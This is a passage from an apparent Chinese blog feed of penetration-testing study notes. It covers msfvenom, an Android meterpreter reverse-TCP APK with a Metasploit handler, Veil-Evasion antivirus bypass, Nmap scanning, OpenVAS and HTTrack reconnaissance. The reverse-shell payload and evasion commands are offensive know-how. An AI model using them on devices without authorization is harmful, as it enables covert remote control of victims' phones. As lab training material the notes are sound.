color="#fb8c00">–payload-options</font>来查看这个payload需要设置的参数：</p><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp --payload-options</code></pre><h3 id="meterpreter在安卓系统的应用"><a href="#meterpreter在安卓系统的应用" class="headerlink" title="meterpreter在安卓系统的应用"></a>meterpreter在安卓系统的应用</h3><p>测试用的手机应与kali计算机连在同一局域网内(kali虚拟机采用桥接模式)<br>在Kali平台下实施如下操作</p><ol><li>创建andriod平台下的远程控制程序:<pre class=" language-bash"><code class="language-bash">msfvenom -p android/meterpreter/reverse_tcp lhost<span class="token operator">=</span>192.168.190.138 lport<span class="token operator">=</span>5000 R<span class="token operator">></span>/root/payload.apk</code></pre></li></ol><ul><li><font color="#fb8c00">R&gt;</font> 因为msfvenom命令中默认没有apk这种可以直接在Android操作系统执行的文件格式，使用此参数可以保持文件原格式，就不必再使用<font color="#fb8c00">-f -o</font>指定输出格式和输出文件的位置。</li><li>其他所有参数与攻击Windows操作系统下的命令含义相同。</li></ul><ol start="2"><li>在Metasploit中执行以下命令：<pre class=" language-bash"><code class="language-bash">use exploit/multi/handler<span class="token keyword">set</span> payload android/meterpreter/reverse_tcp<span class="token keyword">set</span> lhost 192.168.190.138<span class="token keyword">set</span> lport 5000exploit</code></pre></li><li>在手机上启动payload.apk程序，即可在kali上执行远程控制程序。</li><li>连接成功过后使用<font color="#fb8c00">help</font>命令可以查看meterpreter在android系统中适用的指令</li></ol><h2 id="使用Veil-Evasion绕过杀毒软件"><a href="#使用Veil-Evasion绕过杀毒软件" class="headerlink" title="使用Veil-Evasion绕过杀毒软件"></a>使用Veil-Evasion绕过杀毒软件</h2><h3 id="安装veil-Evasion"><a href="#安装veil-Evasion" class="headerlink" title="安装veil-Evasion"></a>安装veil-Evasion</h3><p>kali并没有安装好Veil,在终端输入以下命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> evil-evasion</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试知识点(3)</title>
      <link href="/2019/11/14/penetrationtest3/"/>
      <url>/2019/11/14/penetrationtest3/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在执行侦察步骤(请参阅渗透测试(2))过后，我们建立了一个IP地址列表，该目标列表既是我们目标计算机的IP地址，也是我们被授权对其进行攻击的IP地址，在侦察中，我们建立了搜集到的信息与受攻击IP地址之间的映射关系，在扫描中，我们将建立IP地址与开放端口和服务的映射关系。</p><p>大多数网络的职责就是至少允许某些信息穿越网络边界与外界进行沟通，完全孤立的网络，既没有与互联网连接，也没有提供像电子邮件或Web这样的服务。每一种服务，不管是直接或间接与外界连接，都会给攻击者提供潜在的立足点，我们将扫描过程分为以下四步：</p><ol><li>用<font color="#fb8c00">ping</font>数据包验证系统是否正在运行。</li><li>用<font color="#fb8c00">Nmap</font>扫描系统端口</li><li>用<font color="#fb8c00">Nmap脚本引擎(NSE)</font>进一步查询目标</li><li>用<font color="#fb8c00">Nessus</font>扫描系统漏洞<br>有些扫描工具将这几个阶段合并成一个单一的过程</li></ol><ul><li>1目的：判断目标系统是否已经开启以及是否可以与我们的计算机进行通信。无论这一步产生怎样的结果，我们都应进行下面的操作，</li><li>2目的：识别在特定主机上开启了哪些端口以及运行了哪些服务(Nmap可将1.2合并为一步)</li><li>3目的：利用NSE进一步查询，验证早期的发现</li><li>4目的：定位和识别运行在目标计算机上的服务和软件有哪些已知漏洞</li></ul><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>端口提供了软件、服务、网络与硬件(包括电脑在内)进行通信的途径和场所，端口为计算机与计算机之间、计算机与软件之间、计算机与设备之间交换信息提供了一个数据连接。在计算机与网络互连之前，计算机之间通过物理介质进行通信，例如软盘，当计算机互连成网络后，它们之间就通过端口进行通信。使用多端口允许多个通信同时进行，无需等待。(把计算机想象成一所房子，人进入房子的方式有很多种，每一个进入房子(计算机)的通道就类似于计算机端口。所有通道就像计算机的端口一样，允许流量进出计算机。)</p><p>很多常用的网络服务都运行在标准的端口号上，它提示攻击者目标系统开启了哪些功能。比如：</p><ul><li>port:80 HTTP</li><li>port:443 HTTPS</li></ul><p>每一个端口都是进入目标系统的潜在通道，对于对外提供网络服务的服务器，我们必须利用的端口开放。(如HTTP端口80，FTP端口21等)</p><h3 id="跳板攻击-Pivoting"><a href="#跳板攻击-Pivoting" class="headerlink" title="跳板攻击(Pivoting)"></a>跳板攻击(Pivoting)</h3><p>侵入一台机器，然后使用该机器作为跳板攻击另一台机器</p><h3 id="扫描外部设备"><a href="#扫描外部设备" class="headerlink" title="扫描外部设备"></a>扫描外部设备</h3><p>不管我们是想进入到一个目标网络内还是想控制某些机密的内部机器，一般都要从扫描外部设备开始。先扫描外部设备是因为我们在侦察阶段所获得的信息大部分都是属于外部设备的，除此之外，我们不可能总有机会直接进入目标网络内，因此，我们通常使用跳板攻击，通过逐步控制一系列中间设备，并以它们为跳板，达到控制最终目标的目的。</p><h4 id="外部设备"><a href="#外部设备" class="headerlink" title="外部设备"></a>外部设备</h4><p>外部设备包括计算机、服务器、路由器和防火墙以及其他设备，它们被部署在保护网络的边缘，这些设备是内部被保护资源和外部网络(如Internet)互相通信的中介。</p><h2 id="Ping和Ping扫描"><a href="#Ping和Ping扫描" class="headerlink" title="Ping和Ping扫描"></a>Ping和Ping扫描</h2><p>ping是一种特定类型的网络数据包，称为ICMP数据包。ping用于给计算机或网络设备上的某些特殊接口发送特定类型的网络流量，这种特定类型的网络流量叫做ICMP回显数据包(ICMP Echo Request packets)。如收到ping包的设备(及其所附网卡)是开启的且不限制响应，那么它就会回应一个回显响应的数据包(Echo Reply packets)给发送方。ping包除了告诉我们某台主机是活动的并正在接收流量外，还提供数据包往返总时间、报告流量丢失情况、衡量一个网络连接的可靠性等。</p><p>要在Linux上运行Ping命令，需要在终端发出如下命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> target_ip</code></pre><p>比如，我们如果相对百度执行Ping命令，则在终端输入以下命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> www.baidu.com</code></pre><p>得到的结果如下图所示：<br><img src="https://i.postimg.cc/cLCmvkrM/1.png" alt=""></p><ul><li>上图框中的一行告诉我们ICMP回显请求数据包成功到达了目标主机，并且该主机给我们的计算机发回了响应数据包。</li><li><font color="#fb8c00">64 bytes</font>表明响应数据包的大小</li><li><font color="#fb8c00">from 39.156.66.18(39.156.66.18)</font>指定了我们的<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的主机名及IP地址。</li><li><font color="#fb8c00">icmp_seq=</font>指定数据包的顺序</li><li><font color="#fb8c00">ttl=</font>是生存时间值，用来确定数据包自动终止前可以经历的最大跳数</li><li><font color="#fb8c00">Time</font>告诉我们的数据包到目标往返一趟的时间</li></ul><h3 id="ping扫描"><a href="#ping扫描" class="headerlink" title="ping扫描"></a>ping扫描</h3><p>ping扫描就是自动发送一系列的ping包给指定范围内的IP地址，而不需要手动地逐个输入目标地址。</p><p>执行Ping扫描最简单的方法是使用FPing工具，FPing已经内嵌于Kali中，以终端方式运行。可以在终端输入以下命令：</p><pre class=" language-bash"><code class="language-bash">fping -a -g 39.156.66.14 39.156.66.18</code></pre><ul><li><font color="#fb8c00">-a</font> 表示在输出中只显示活动主机</li><li><font color="#fb8c00">-g</font> 用于指定我们想要扫描的IP地址范围</li></ul><blockquote><p>注：不是每个主机都会响应ping命令，有些主机上的防火墙或其他设施会抑制ping包</p></blockquote><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li>现在我们已经有了一个目标列表，我们可以针对其中的每一个探寻到的IP地址执行端口扫描。端口扫描的目的是为了识别在我们的目标系统上哪些端口是开启的，以及判断哪些服务是开启的。服务就是在计算机上执行的某个特定工作或任务，比如电子邮件服务、FTP服务、打印服务，或Web网页访问服务。端口扫描就如图敲一所房子的门和窗，看哪个会有回应。例如，如果我们发现80端口是开启的，我们可以尝试连接这个端口。这样就能不断地收集到监听在该端口的Web服务的相关信息。</li><li>端口是基于TCP或UDP协议的，这取决于端口上运行的服务以及在端口上所运行的通信类型。</li><li>当我们执行端口扫描时，我们的工具会创建数据包并将其发送给目标的每一个指定端口。这么做的目的是为了验证目标端口将给出什么样的响应，不同类型的端口扫描会显示不同的结果。</li></ul><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>大多数新手都会认为黑客入侵是一种图形化的任务，但事实上，你的主要目标是获得一个有管理员权限的shell或进入目标电脑的后门。这个shell是一个字符形式的终端，它允许攻击者通过使用命令行来控制目标主机。</p><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>当某个网络上的两台计算机使用TCP进行通信时，它需要完成三次握手。这个过程与电话交谈类似。当你想通过电话和某人交谈时，你要先进行拨号，拨通后，对方在不知道你是谁的情况下说”喂？你好。”，这时你就可以说“嗨，我是张三。”对方知晓你的身份后，双方都有了足够的信息并可以开始正常交谈了。</p><p>计算机的工作方式大致相同。当两台计算机想要对话时，第一台计算机通过发送一个SYN数据包给特定的端口号来连接第二台计算机，如果第二台计算机正在进行监听，它会发送一个SYN/ACK响应数据包作为响应。当第一台计算机收到SYN/ACK之后，由它再向第二台计算机回应一个ACK包，这时，两台计算机就可以正常运行了。在上述打电话的例子中，拨号相当于发送了SYN数据包，对方回应”喂？你好。”相当于返回一个SYN/ACK响应，最后你说“嗨，我是张三”则相当于返回了一个ACK响应数据包。</p><h2 id="使用Nmap进行主动扫描"><a href="#使用Nmap进行主动扫描" class="headerlink" title="使用Nmap进行主动扫描"></a>使用Nmap进行主动扫描</h2><h3 id="Nmap的基本用法"><a href="#Nmap的基本用法" class="headerlink" title="Nmap的基本用法"></a>Nmap的基本用法</h3><h4 id="对单个主机的扫描"><a href="#对单个主机的扫描" class="headerlink" title="对单个主机的扫描"></a>对单个主机的扫描</h4><p>在终端输入如下命令：</p><pre class=" language-bash"><code class="language-bash">namp 192.168.190.134</code></pre><p>上述指令对IP地址为192.168.190.134的主机进行扫描，结果如图所示：<br><img src="https://i.postimg.cc/XYPgdK5M/2.png" alt=""></p><ul><li>第一行给出Nmap的版本为7.80，扫描开始时间</li><li>第二行给出一个标题</li><li>第三行的<font color="#fb8c00">up</font>给出目标主机的状态，<font color="#fb8c00">up</font>意味着这台主机处于开机并连上互联网的状态</li><li>第四行表示在进行检查的1000个端口中(默认)，有997个是关闭的</li><li>接下来的字段，<font color="#fb8c00">PORT</font>指端口，<font color="#fb8c00">STATE</font>指状态，<font color="#fb8c00">SERVICE</font>指的是运行的服务。(此字段第一行表示目标计算机上的135号端口处于开放状态，这个端口提供msrpc服务)</li><li>紧接着的一行给出目标主机的MAC地址</li><li>最后一行表示经过对1台主机扫描，发现1台状态为up的主机，耗时1.4s</li></ul><p>对上述指令加一个参数<font color="#fb8c00">-sn</font>,其意义是扫描目标主机是否在线</p><pre class=" language-bash"><code class="language-bash">nmap -sn 192.168.190.134</code></pre><h4 id="对多个不连续的主机进行扫描"><a href="#对多个不连续的主机进行扫描" class="headerlink" title="对多个不连续的主机进行扫描"></a>对多个不连续的主机进行扫描</h4><p>命令语法：</p><pre class=" language-bash"><code class="language-bash">nmap IP1 IP2 IP3</code></pre><h4 id="对多个连续主机进行扫描"><a href="#对多个连续主机进行扫描" class="headerlink" title="对多个连续主机进行扫描"></a>对多个连续主机进行扫描</h4><p>命令语法：</p><pre class=" language-bash"><code class="language-bash">nmap 192.168.190.134-255</code></pre><h4 id="对整个子网进行扫描"><a href="#对整个子网进行扫描" class="headerlink" title="对整个子网进行扫描"></a>对整个子网进行扫描</h4><p>命令语法：</p><pre class=" language-bash"><code class="language-bash">nmap IP地址/掩码位数nmap 192.168.190.134/24</code></pre><h3 id="使用Nmap进行主机发现"><a href="#使用Nmap进行主机发现" class="headerlink" title="使用Nmap进行主机发现"></a>使用Nmap进行主机发现</h3><h4 id="使用Nmap进行ARP连接扫描"><a href="#使用Nmap进行ARP连接扫描" class="headerlink" title="使用Nmap进行ARP连接扫描"></a>使用Nmap进行ARP连接扫描</h4><p>这种方式仅能用于与Nmap所在主机在同一子网的目标主机。当满足这个条件后，使用ARP扫描不仅速度快，而且结果最为精准，这是因为没有任何安全措施会阻止正常的ARP请求。<br>命令语法如下：</p><pre class=" language-bash"><code class="language-bash">nmap -PR 192.168.190.134</code></pre><h4 id="使用Nmap进行TCP连接扫描"><a href="#使用Nmap进行TCP连接扫描" class="headerlink" title="使用Nmap进行TCP连接扫描"></a>使用Nmap进行TCP连接扫描</h4><p>TCP连接扫描被认为是端口扫描中最基础最稳定的，因为Nmap试图在其命令指定的每个端口上完成三次握手。这种扫描完成后，又以友好的方式断开连接，因此很少有机会对目标系统进行洪泛攻击并导致崩溃。</p><p>如果没有给出特定的端口扫描范围，Nmap将会扫描1000个最常用的端口。使用Nmap时，可以使用<font color="#fb8c00">-p-</font>参数指定扫描所有端口，建议使用<font color="#fb8c00">-Pn</font>参数，启用该参数将会导致Nmap禁用主机发现功能并假设每一个系统都是活动的，强行对其进行扫描。这对于发现在常规扫描中可能会漏掉的系统和端口非常有用</p><p>为了运行TCP连接，我们在终端下执行以下命令：</p><pre class=" language-bash"><code class="language-bash">nmap -sT -p- -Pn 192.168.190.130</code></pre><ul><li><font color="#fb8c00">-sT</font> Nmap运行了一个TCP连接扫描，s告诉Nmap要运行哪种类型的扫描，-T用来执行一个TCP连接扫描</li><li><font color="#fb8c00">-p-</font> 告诉Nmap要扫描所有端口，而不是只扫描默认的1000个常用端口</li><li><font color="#fb8c00">-Pn</font> 跳过主机发现阶段，对所有地址进行扫描。</li></ul><p>通常，我们需要对整个子网或某一IP地址段进行扫描，在这种情况下，我们只需要将最后一个IP地址的最后一个字节添加到Nmap命令后面，就可以扫描一段连续范围内的IP地址：</p><pre class=" language-bash"><code class="language-bash">nmap -sT -p- -Pn 192.168.190.1-130</code></pre><p>这条命令的执行会造成Nmap对IP地址为192.168.190.1到192.168.190.130范围内的所有主机进行端口扫描。</p><h4 id="使用Nmap进行SYN扫描"><a href="#使用Nmap进行SYN扫描" class="headerlink" title="使用Nmap进行SYN扫描"></a>使用Nmap进行SYN扫描</h4><ul><li>SYN扫描是Nmap扫描的默认扫描方式。SYN扫描比TCP连接扫描更快而且仍然相当安全，几乎不会造成拒绝服务攻击(DOS)或是目标系统瘫痪。SYN扫描并没有完成三次握手，只是完成了前两步，所以它的速度非常快。</li><li>在SYN扫描中，执行扫描的主机发送SYN数据包给目标，目标回复SYN/ACK(假定端口已经启用且没有进行数据包过滤)，到目前为止，都与TCP连接扫描一样，但是接下来，执行扫描的计算机并没有向目标发送ACK数据包，而是发送了一个RST(重置)数据包给目标计算机。重置数据包告诉目标计算机放弃前面接收的所有包，并关闭两台计算机之间的连接。</li><li>如果把三次握手看成一次打电话的过程，SYN扫描就像是一方呼叫另一方，接收方拿起电话说：“喂？”，这时发送方一声不吭的挂掉了电话。</li></ul><p>要运行SYN扫描，在终端输入以下命令：</p><pre class=" language-bash"><code class="language-bash">nmap -sS -p- -Pn 192.168.190.130</code></pre><h4 id="使用Nma进行UDP扫描"><a href="#使用Nma进行UDP扫描" class="headerlink" title="使用Nma进行UDP扫描"></a>使用Nma进行UDP扫描</h4><p>TCP连接扫描和SYN扫描都是基于TCP进行通信的。如果我们想要找寻基于UDP的服务，我们需要操控Nmap创建UDP数据包进行扫描，要进行UDP扫描，在终端输入以下命令即可：</p><pre class=" language-bash"><code class="language-bash">nmap -sU 192.168.190.130</code></pre><p>此命令没有<font color="#fb8c00">-p- -Pn</font>是因为UDP扫描非常慢，即使在默认的1000个端口执行一个基本的UDP扫描，也要花费很多时间。</p><p>使用UDP进行通信不需要接收方做出响应，所以Nmap很难区分UDP端口是开启了还是扫描数据包被过滤了，所以，当Nmap执行<br>一个UDP扫描却没有收到任何响应信息时，它就会反馈给用户该端口“open|filtered(启用或过滤)”的信息，但在实际扫描中，几乎所有的端口都会被标记为”open|filtered”。</p><h5 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h5><p>为了使目标返回对我们更加有用的信息，我们在UDP扫描中添加“-sV”参数，通过此参数用于版本扫描，但此处可用于缩小UDP扫描的范围。</p><p>启用了版本扫描后，Nmap会发送额外的探测信息给每个扫描到的“open|filtered”端口。这个额外的探测信息试图发送额外的特制数据包来识别服务，这些特制数据包往往会成功触发目标进行响应。通常情况下，会将扫描报告中的结果从“open|filtered”改为”open”。使用版本扫描的命令如下:</p><pre class=" language-bash"><code class="language-bash">nmap -sUV 129.168.190.130</code></pre><h4 id="TCP和UDP"><a href="#TCP和UDP" class="headerlink" title="TCP和UDP"></a>TCP和UDP</h4><ul><li>TCP是“面向连接的协议”，因为它需要通信双方保持同步，它确保发送方发出的数据包被接受方正确且按序接收。，TCP的工作机制类似于打电话。</li><li>UDP是“无连接”的，因为它只需要发送方将数据包发送给接收者，并没有提供任何确认数据包是否到达目的地的机制。UDP的工作机制类似于往信箱里投一封信。大多数情况下，发送方只是在信封上写个地址。贴个邮票，并把信投进信箱，最后，配送员取走信件并开始配送，在这个过程中，发送方并不会收到回执或确认信息，一旦邮递员取走信件，发送方不能保证信件能够到达最终目的地。</li></ul><h3 id="使用Nmap进行端口发现"><a href="#使用Nmap进行端口发现" class="headerlink" title="使用Nmap进行端口发现"></a>使用Nmap进行端口发现</h3><p>Nmap对目标的端口进行扫描时，对端口状态的判断有以下5种：</p><ul><li><font color="#fb8c00">open</font> 应用程序在该端口接收TCP或UDP报文</li><li><font color="#fb8c00">closed</font> 端口关闭</li><li><font color="#fb8c00">filtered</font> 由于包过滤阻止探测报文到达端口，nmap无法确定端口是否开放。(过滤可能来自专业的防火墙设备，路由规则或主机上的软件防火墙)</li><li><font color="#fb8c00">unfiltered</font> 此状态意味端口可被访问，但无法确定其是否开放。(只有映射防火墙规则集的ACK才会把端口分类到这个状态)</li><li><font color="#fb8c00">open | filtered</font> 无法确定端口被过滤还是开放，开放的端口不响应就属于其中一种情况。</li></ul><h4 id="扫描全部端口"><a href="#扫描全部端口" class="headerlink" title="扫描全部端口"></a>扫描全部端口</h4><p>命令语法：</p><pre class=" language-bash"><code class="language-bash">nmap -p <span class="token string">"*"</span> 192.168.190.134</code></pre><h4 id="扫描指定端口"><a href="#扫描指定端口" class="headerlink" title="扫描指定端口"></a>扫描指定端口</h4><p>命令语法：</p><pre class=" language-bash"><code class="language-bash">nmap -p 80 192.168.190.134</code></pre><h3 id="使用Nmap扫描目标主机的操作系统"><a href="#使用Nmap扫描目标主机的操作系统" class="headerlink" title="使用Nmap扫描目标主机的操作系统"></a>使用Nmap扫描目标主机的操作系统</h3><p>命令语法：</p><pre class=" language-bash"><code class="language-bash">nmap -O 192.168.190.134</code></pre><h3 id="使用Nmap扫描目标服务"><a href="#使用Nmap扫描目标服务" class="headerlink" title="使用Nmap扫描目标服务"></a>使用Nmap扫描目标服务</h3><p>通过添加<font color="#fb8c00">-sV</font>来进行服务和版本的识别。命令语法如下：</p><pre class=" language-bash"><code class="language-bash">nmap -sV 192.168.190.134</code></pre><h3 id="使用Nmap执行Xmas扫描"><a href="#使用Nmap执行Xmas扫描" class="headerlink" title="使用Nmap执行Xmas扫描"></a>使用Nmap执行Xmas扫描</h3><h4 id="RFC文档"><a href="#RFC文档" class="headerlink" title="RFC文档"></a>RFC文档</h4><p>在计算机世界中，RFC要么是一个注释文档，要么是关于现有某项技术或标准的技术规格。RFC为我们提供了大量的特定系统内部运作的细节。攻击者会在其中查找文档所描述的系统的漏洞。Xmas Tree(圣诞树)扫描和Null(空)扫描正是利用了这样的漏洞进行攻击的。</p><h4 id="Xmas-Tree扫描"><a href="#Xmas-Tree扫描" class="headerlink" title="Xmas Tree扫描"></a>Xmas Tree扫描</h4><p>之所以叫Xmas Tree扫描，其原因是数据包的FIN、PSH和URG标记置为“on(打开)”。我们把数据包那么多标记被打开的现象描绘为“就像点亮了一棵圣诞树”。Xmas Tree数据包不常用的原因是数据包中的SYN和ACK标记一般不会被打开。</p><p>在TCP的RFC中是这样描述的，如果一个关闭的端口收到的数据包没有置位(打开)SYN、ACK或RST标记，该端口就会发送RST包作为响应。如果开启的端口收到这样的数据包，那么该端口就会忽略该数据包。假定计算机的操作系统完全遵循TCP RFC文档，那么不用完成连接的过程，甚至仅在发起连接的情况下，Nmap就可以断定一个端口的状态。</p><p>要在终端使用Xmas Tree扫描，要在终端输入以下指令：</p><pre class=" language-bash"><code class="language-bash">nmap -sX -p- -Pn 129.168.190.130</code></pre><blockquote><p>注：Xmas Tree扫描只针对Unix和Linux系统，对Windows系统不管用。</p></blockquote><h4 id="Null扫描"><a href="#Null扫描" class="headerlink" title="Null扫描"></a>Null扫描</h4><p>Null扫描与Xmas Tree扫描的原理类似，进行Null扫描的命令如下：</p><pre class=" language-bash"><code class="language-bash">nmap -sN -p- -Pn 192.168.190.130</code></pre><h3 id="Nmap脚本引擎"><a href="#Nmap脚本引擎" class="headerlink" title="Nmap脚本引擎"></a>Nmap脚本引擎</h3><p>NSE将Nmap的功能扩展到传统端口扫描之外。<br>为了调用NSE，我们使用”- -script”参数，后面加上参数或脚本名，以及目标IP地址：</p><pre class=" language-bash"><code class="language-bash">nmap --script banner 192.168.190.130</code></pre><ul><li><font color="#fb8c00">banner</font>脚本是一个Nmap扩展，创建到TCP端口的一个连接，并将目标系统发送的任何输出打印到本地终端。这在识别隐藏端口上未识别服务极其有用。</li></ul><p>类似地，我们可以使用<font color="#fb8c00">- -script category_name</font>格式调用整组或整个类别的脚本，如：</p><pre class=" language-bash"><code class="language-bash">nmap --script vuln 192.168.190.130</code></pre><ul><li><font color="#fb8c00">vuln</font>将运行在目标系统上搜索已知问题的脚本，这一类别通常只在发现漏洞时提供输出。</li></ul><h3 id="端口扫描总结"><a href="#端口扫描总结" class="headerlink" title="端口扫描总结"></a>端口扫描总结</h3><p>一旦完成端口扫描，就得到了目标计算机上开放端口以及运行的服务的列表。在检查Nmap输出的时候，对端口扫描中发现的所有远程访问服务，我们应尝试登录。</p><h3 id="将Nmap的扫描结果保存为XML文件"><a href="#将Nmap的扫描结果保存为XML文件" class="headerlink" title="将Nmap的扫描结果保存为XML文件"></a>将Nmap的扫描结果保存为XML文件</h3><p>命令语法：</p><pre class=" language-bash"><code class="language-bash">nmap -oXReport.xml 192.168.190.134</code></pre><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>当我们拥有目标计算机的IP地址列表，并且已知这些计算机上开放的端口和已启用的服务之后，就可以开始漏洞扫描。漏洞扫描可以让我们直接跳到第三步：获取系统控制权。</p><h3 id="使用Openvas进行漏洞扫描"><a href="#使用Openvas进行漏洞扫描" class="headerlink" title="使用Openvas进行漏洞扫描"></a>使用Openvas进行漏洞扫描</h3><h4 id="在kali中安装Openvas"><a href="#在kali中安装Openvas" class="headerlink" title="在kali中安装Openvas"></a>在kali中安装Openvas</h4><ol><li><p>更新系统软件包索引：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> update</code></pre></li><li><p><font color="#fb8c00">dist-upgrade</font>命令对系统进行更新，与<font color="#fb8c00">upgrade</font>不同的是，<font color="#fb8c00">dist-upgrade</font>可以根据依赖关系的变化来添加包和删除包</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> dist-upgrade</code></pre></li><li><p>在kali上安装openvas</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> openvas</code></pre></li><li><p>初始化openvas</p><pre class=" language-bash"><code class="language-bash">openvas-setup</code></pre></li><li><p>向openvas中添加用户名和密码</p><pre class=" language-bash"><code class="language-bash">openvasmd --user<span class="token operator">=</span>admin --new-password<span class="token operator">=</span>admin</code></pre></li><li><p>在浏览器中访问<font color="#fb8c00"><a href="https://127.0.0.1:9392" target="_blank" rel="noopener">https://127.0.0.1:9392</a></font>打开openvas的一个Web化的控制界面。</p></li></ol><blockquote><p>注：如果已经安装openvas，在终端使用openvas-start命令后访问上述网址即可打开openvas</p></blockquote><h4 id="使用openvas"><a href="#使用openvas" class="headerlink" title="使用openvas"></a>使用openvas</h4><ol><li>选择scan下tasks<br><img src="https://i.postimg.cc/7Z53HCWK/3.png" alt=""></li><li>选择星型图案下的new tasks<br><img src="https://i.postimg.cc/Zq36NGZ3/4.png" alt=""></li><li>选择下图中的标志对靶机进行设置<br><img src="https://i.postimg.cc/26Dh708t/5.png" alt=""></li><li>在弹出的窗口中对靶机的IP地址以及名字进行设置,点击create完成设置<br><img src="https://i.postimg.cc/fLfX2YVR/6.png" alt=""></li><li>在New Task窗口中点击create完成此次漏洞扫描的设置</li><li>点击菜单的scan选项，选择tasks，出现如下图所示界面，红框中的windowsXP即为刚才所创建的扫描，单击右侧绿色按钮开始进行扫描。<br><img src="https://i.postimg.cc/QC67sskL/7.png" alt=""></li><li>扫描过程中status一栏中会变成黄色的request，当扫描完成后，会变成上图中第一栏的蓝色的Done。</li></ol><h4 id="查看openvas的扫描报告"><a href="#查看openvas的扫描报告" class="headerlink" title="查看openvas的扫描报告"></a>查看openvas的扫描报告</h4><ol><li>完成后点击Last一栏的日期，出现如下界面：<br><img src="https://i.postimg.cc/3r9m2CML/8-jp.jpg" alt=""></li></ol><ul><li><font color="#fb8c00">Vulnerability</font>显示的是漏洞名称(单击漏洞名称可以显示该漏洞的详细信息)</li><li><font color="#fb8c00">security</font>显示的是漏洞的威胁级别</li><li><font color="#fb8c00">Host</font>显示的是存在该漏洞的主机</li><li><font color="#fb8c00">Location</font>表示漏洞的端口</li><li>该页面的漏洞级别是根据威胁级别从高到低排列的</li></ul><ol start="2"><li><p>可以单击菜单栏的scan选择Results，获得图形化的扫描报告。</p></li><li><p>导出扫描报告：点击菜单栏scan，选择tasks，点击last中的日期，会出现下图界面，单击框中的选项选择导出格式，然后点击后面的绿色按钮进行保存路径选择。(默认保存在Downloads目录中)</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试知识点(2)</title>
      <link href="/2019/11/13/penetrationtest2/"/>
      <url>/2019/11/13/penetrationtest2/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>侦察也就是信息收集。在收集目标信息上花的时间越多，后续阶段的成功率就越高。</p><h3 id="侦察步骤"><a href="#侦察步骤" class="headerlink" title="侦察步骤"></a>侦察步骤</h3><ol><li>侦察以彻底地搜索目标的公共信息开始：有些组织把这些信息叫做开源情报(Open-Source Intellgence,OSINT)。这个步骤的好处是，通常不用发送数据包也能收集到海量数据。虽然侦查阶段所用到的用某些工具直接向目标发送信息，但要分清哪些工具会跟目标联络，哪些不会，这点很重要。该步骤有两个任务：</li></ol><ul><li>收集与目标相关的信息，越多越好。</li><li>分类收集所有信息，创建可进行攻击的IP地址或者统一资源定位符(URL)列表。</li></ul><h3 id="制定策略"><a href="#制定策略" class="headerlink" title="制定策略"></a>制定策略</h3><p>若想顺利地进行侦察工作，必须先制定一个策略。典型的策略应包含主动和被动的侦察。</p><ul><li>主动侦察(active recooaissance)包括与目标系统直接交互。在这个过程中，目标可能会记录下我们的IP地址及活动。如果我们试图以隐身的方式进行渗透测试，就更有可能被检测出来。</li><li>被动侦察(passive recooaissance)则可以利用从网上获取的海量信息。当执行被动侦察时，不会直接与目标交互，因此目标不会知道或记录我们的活动。</li></ul><h3 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h3><p>收集信息时，应把数据信息集中保存。可能的话，最好都以电子格式保存。</p><h2 id="HTTrack-网站复制机"><a href="#HTTrack-网站复制机" class="headerlink" title="HTTrack:网站复制机"></a>HTTrack:网站复制机</h2><p>首先要做的是细致浏览目标的网站。</p><ul><li>HTTrack可以将网站逐页复制下来，能够创建与目标网站完全相同的脱机副本。</li><li>复制的内容包括原始网站所有网页、链接、图片和代码，这些文件将储存在你的本地电脑里。</li><li>利用这类网站复制工具，可以在脱机状态下尽情挖掘某个网站的资源，而不用花时间在目标公司的Web服务器上闲逛。</li></ul><blockquote><p>注：只要是属于目标的资源，任何时候与之直接交互，都有可能留下数字指纹(Digital Fingerprint)</p></blockquote><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p>Linux环境下在终端输入：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> httrack</code></pre><p>安装完成后使用如下命令运行它：</p><pre class=" language-bash"><code class="language-bash">httrack</code></pre><h3 id="使用"><a href="#使用" class="headerlink" 